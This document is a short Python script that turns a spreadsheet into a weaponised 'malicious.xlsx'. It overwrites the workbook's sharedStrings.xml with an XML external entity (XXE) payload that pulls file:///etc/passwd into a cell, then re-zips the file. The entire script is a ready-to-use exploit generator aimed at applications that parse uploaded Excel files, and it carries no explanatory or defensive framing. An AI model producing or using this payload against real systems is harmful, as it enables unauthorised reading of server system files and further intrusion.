import zipfile
import os

# Define the XXE payload
xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="2" uniqueCount="2">
  <si>
    <t>&xxe;</t>
  </si>
  <si>
    <t>World</t>
  </si>
</sst>
'''

# Unzip the basic.xlsx file
with zipfile.ZipFile('basic.xlsx', 'r') as zip_ref:
    zip_ref.extractall('temp_dir')

# Overwrite the sharedStrings.xml file with the XXE payload
with open('temp_dir/xl/sharedStrings.xml', 'w') as file:
    file.write(xxe_payload)

# Re-zip the contents to create the malicious.xlsx file
with zipfile.ZipFile('malicious.xlsx', 'w') as zip_ref:
    for foldername, subfolders, filenames in os.walk('temp_dir'):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            arcname = os.path.relpath(file_path, 'temp_dir')
            zip_ref.write(file_path, arcname)

# Clean up
import shutil
shutil.rmtree('temp_dir')
